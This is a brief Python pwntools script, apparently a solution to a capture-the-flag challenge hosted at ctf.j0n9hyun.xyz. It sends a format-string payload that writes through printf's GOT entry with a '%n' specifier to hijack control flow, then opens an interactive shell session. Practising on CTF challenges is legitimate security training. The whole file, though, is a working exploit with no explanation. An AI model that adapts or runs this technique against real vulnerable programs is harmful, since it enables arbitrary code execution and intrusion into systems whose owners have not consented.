from pwn import*                                                                                                                                      
p = remote("ctf.j0n9hyun.xyz",3002)                                                                                                                   

p.recvuntil("input : ")                                                    
printf_got = 0x804a00c                                                     
payload =p32(printf_got)+"%134514096x%n"                                                                                                             

p.sendline(payload)                                                        
p.interactive()  
